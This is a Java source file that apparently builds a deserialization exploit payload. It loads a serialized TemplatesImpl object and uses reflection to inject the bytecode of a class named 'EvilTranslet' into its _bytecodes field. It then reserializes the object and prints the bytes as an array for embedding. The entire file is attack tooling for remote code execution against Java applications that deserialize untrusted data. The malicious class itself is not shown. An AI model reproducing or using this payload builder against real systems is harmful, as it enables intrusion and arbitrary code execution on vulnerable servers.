import java.io.*;
import java.lang.reflect.*;

public class Rewrite {
  private static void writeField(Object o, String field, Object value) throws Exception {
    Field f = o.getClass().getDeclaredField(field);
    f.setAccessible(true);
    f.set(o, value);
  }

  private static byte[] getBytes(String file) throws Exception {
    File f = new File(file);
    byte[] b = new byte[(int)f.length()];
    FileInputStream fis = new FileInputStream(f);
    fis.read(b);
    fis.close();
    return b;
  }

  public static void main(String[] args) throws Exception {
    FileInputStream fis = new FileInputStream("t.ser");
    ObjectInputStream ois = new ObjectInputStream(fis);

    com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl template = (com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) ois.readObject();

    byte[] newByteCode = getBytes("EvilTranslet.class");
    byte[] helper = getBytes("EvilTranslet$1.class");

    writeField(template, "_bytecodes", new byte[][]{newByteCode, helper});

    System.out.println(template);

    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(bos);
    oos.writeObject(template);

    byte[] bytes = bos.toByteArray();

    System.out.print("{");
    for (int i = 0; i < bytes.length; ++i) {
      System.out.print(bytes[i]);
      System.out.print(",");

    }

    System.out.println("}");

  }
}

